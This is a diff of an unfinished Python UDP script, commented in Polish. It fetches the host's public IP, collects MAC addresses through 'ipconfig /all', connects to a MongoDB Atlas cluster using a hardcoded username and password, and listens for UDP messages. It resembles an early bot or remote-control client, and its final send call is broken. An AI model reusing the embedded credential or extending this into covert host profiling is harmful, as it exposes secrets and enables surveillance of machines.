@@ -2,17 +2,19 @@ import socket, subprocess as sub
 from requests import get 
 from pymongo.mongo_client import MongoClient
 from pymongo.server_api import ServerApi
-import threading
+from utils import cmd_formatter
 
-SERVER_IP = '127.0.0.1' # Zmień na adres serwera, jeśli działa na innej maszynie
-SERVER_PORT = 9999 
+HOST = "0.0.0.0"                # Symbolic name meaning all available interfaces
+PORT = 9999              # Arbitrary non-privileged port
+IP = get('https://api.ipify.org').content.decode('utf8')
+client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) # Gniazdo UDP
 
+client.bind((HOST, PORT))
+mac_list = []
 IP = get('https://api.ipify.org').content.decode('utf8')
 print(f'My public IP address is: {IP}')
 
-client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) # Gniazdo UDP
-
-print(f"Klient UDP gotowy do połączenia z {SERVER_IP}:{SERVER_PORT}")
+print(f"Klient UDP gotowy do połączenia z {IP}:{PORT}")
 URI = "mongodb+srv://heker:CihmCAcfLoV9vQ1M@heker.3rwzyne.mongodb.net/?appName=heker"
 # Create a new client and connect to the server
 db = MongoClient(URI, server_api=ServerApi('1'))
@@ -26,27 +28,14 @@ except Exception as e:
     print(e)
     exit()
 
+out = sub.run(["ipconfig", "/all"], capture_output=True)
+# print(cmd_formatter(out.stdout))
+for row in cmd_formatter(out.stdout):
+    if row.find("Physical Address") != -1:
+        mac_list.append(row[row.find(":")+2:])
+        
+print(mac_list)
 while True:
-    try:
-        # 1. Pobierz dane do wysłania
-        prompt = input("> ")
-        if not prompt: # Zabezpieczenie przed pustym wejściem
-            continue 
-            
-        message = prompt.encode()
-        
-        # # 2. WYŚLIJ dane do serwera
-        client.sendto(message, (SERVER_IP, SERVER_PORT))
-        
-        # 3. ODBIERZ odpowiedź od serwera
-        data, address = client.recvfrom(1024)
-        
-        # 4. Wydrukuj otrzymane dane i informację, skąd przyszły
-        print(f"-> {data.decode()}")
-
-
-    except Exception as e:
-        print(f"Wystąpił błąd linia 47: {e}")
-        break # Opuść pętlę w razie błędu
-
-client.close()
+    data, address = client.recvfrom(1024)
+    print(data.decode())
+    client.sendto()
